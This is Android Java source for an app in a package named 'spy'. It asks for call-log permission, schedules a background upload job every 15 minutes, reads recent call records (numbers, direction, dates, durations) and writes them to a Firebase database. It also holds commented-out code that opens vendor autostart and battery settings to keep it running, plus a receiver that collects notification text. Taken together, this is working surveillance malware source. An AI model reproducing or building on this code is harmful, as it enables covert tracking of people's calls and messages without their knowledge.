package com.example.spy;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.ListView;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.TimeUnit;


public class MainActivity extends Activity {

    ListView list;
    CustomListAdapter adapter;
    ArrayList<Model> modelList;
    private DatabaseReference mDatabase;

    private static final Intent[] POWERMANAGER_INTENTS = {
            new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
            new Intent().setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
            new Intent().setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
            new Intent().setComponent(new ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")),
            new Intent().setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
            new Intent().setComponent(new ComponentName("com.samsung.android.lool", "com.samsung.android.sm.battery.ui.BatteryActivity")),
            new Intent().setComponent(new ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
            new Intent().setComponent(new ComponentName("com.htc.pitroad", "com.htc.pitroad.landingpage.activity.LandingPageActivity")),
            new Intent().setComponent(new ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.MainActivity")),
            new Intent().setComponent(new ComponentName("com.transsion.phonemanager", "com.itel.autobootmanager.activity.AutoBootMgrActivity"))
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mDatabase = FirebaseDatabase.getInstance().getReference();

        /*for (Intent intent : POWERMANAGER_INTENTS)
            if (getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                startActivity(intent);
                break;
            }
*/
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 101);
        } else {
            Constraints constraints = new Constraints.Builder()
                    .setRequiresCharging(false)
                    .build();

            final PeriodicWorkRequest periodicWorkRequest1 = new PeriodicWorkRequest.Builder(UploadWorker.class, 15, TimeUnit.MINUTES).setConstraints(constraints).build();
            WorkManager workManager = WorkManager.getInstance(this);
            workManager.enqueueUniquePeriodicWork("SYNC_DATA", ExistingPeriodicWorkPolicy.KEEP, periodicWorkRequest1);
        }


        /*modelList = new ArrayList<Model>();
        adapter = new CustomListAdapter(getApplicationContext(), modelList);
        list = (ListView) findViewById(R.id.list);
        list.setAdapter(adapter);
        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));

        Intent i = new Intent(this, PhonecallReceiver.class);
        this.sendBroadcast(i);
        *//*if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(new Intent(this, NotificationService.class));
        } else {
            startService(new Intent(this, NotificationService.class));
        }*/


        /*getCallDetails();*/

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Constraints constraints = new Constraints.Builder()
                .setRequiresCharging(false)
                .build();

        final PeriodicWorkRequest periodicWorkRequest1 = new PeriodicWorkRequest.Builder(UploadWorker.class, 15, TimeUnit.MINUTES).setConstraints(constraints).build();
        WorkManager workManager = WorkManager.getInstance(this);
        workManager.enqueueUniquePeriodicWork("SYNC_DATA", ExistingPeriodicWorkPolicy.KEEP, periodicWorkRequest1);
    }

    public void getCallDetails() {
        StringBuffer stringBuffer = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Calendar calender1 = Calendar.getInstance();
        calender1.set(Calendar.HOUR, -2);
        String fromDate = String.valueOf(calender1.getTimeInMillis());

        Calendar calendar2 = Calendar.getInstance();
        String toDate = String.valueOf(calendar2.getTimeInMillis());

        String[] whereValue = {fromDate, toDate};


        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, android.provider.CallLog.Calls.DATE + " BETWEEN ? AND ?", whereValue, strOrder);

        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        stringBuffer.append("Call Log :");

        while (managedCursor.moveToNext()) {
            String phoneNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
            //  Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);

            String dir = null;

            int dirCode = Integer.parseInt(callType);

            switch (dirCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED CALL";
                    break;

            }

            stringBuffer.append("\nPhone Number:--- ").append(phoneNumber).append("\nCall Type:--- ").append(dir).append("\nCall Date:---").append(dateString).append("\nCall Duration:---").append(callDuration);
            stringBuffer.append("\n--------------------------");

        }
        managedCursor.close();
        writeToFirebase(stringBuffer.toString());
    }

    private void writeToFirebase(String callDetails) {
        String currentDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
        mDatabase.child("user").child(currentDateTimeString).setValue(callDetails);
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);//Menu Resource, Menu
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.action_settings) {
            Intent intent = new Intent(
                    "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    private BroadcastReceiver onNotice = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            String title = intent.getStringExtra("title");
            String text = intent.getStringExtra("text");
            try {
                byte[] byteArray = intent.getByteArrayExtra("icon");
                Bitmap bmp = null;
                if (byteArray != null) {
                    bmp = BitmapFactory.decodeByteArray(byteArray, 0, byteArray.length);
                }
                Model model = new Model();
                model.setName(title + " " + text);
                model.setImage(bmp);

                if (modelList != null) {
                    modelList.add(model);
                    adapter.notifyDataSetChanged();
                } else {
                    modelList = new ArrayList<>();
                    modelList.add(model);
                    adapter = new CustomListAdapter(getApplicationContext(), modelList);
                    /*list = (ListView) findViewById(R.id.list);*/
                    list.setAdapter(adapter);
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
}
